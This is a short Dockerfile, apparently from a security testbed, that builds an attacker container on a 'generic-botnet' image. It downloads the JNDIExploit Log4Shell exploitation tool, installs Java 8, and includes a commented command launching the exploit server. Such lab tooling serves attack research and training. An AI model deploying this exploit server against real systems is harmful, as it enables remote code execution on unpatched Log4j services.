ARG BASE_REPO=ghcr.io/mentoredtestbed/
# ARG BASE_IMAGE=mentored-base
ARG BASE_IMAGE_TAG=latest

FROM $BASE_REPO"generic-botnet":$BASE_IMAGE_TAG

RUN apt install -y unzip curl
RUN curl -Lo jndi.zip "http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream"
RUN unzip jndi.zip && rm jndi.zip

RUN mkdir -p /etc/apt/keyrings
RUN curl -Lo /etc/apt/keyrings/adoptium.asc https://packages.adoptium.net/artifactory/api/gpg/key/public
RUN echo "deb [signed-by=/etc/apt/keyrings/adoptium.asc] https://packages.adoptium.net/artifactory/deb $(awk -F= '/^VERSION_CODENAME/{print$2}' /etc/os-release) main" | tee /etc/apt/sources.list.d/adoptium.list
RUN apt update && apt install -y temurin-8-jdk && rm -rf /var/lib/apt/lists/*

# CMD java
    # --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
    # -jar JNDIExploit.v1.2.jar -i log4shell-attacker -p 8888
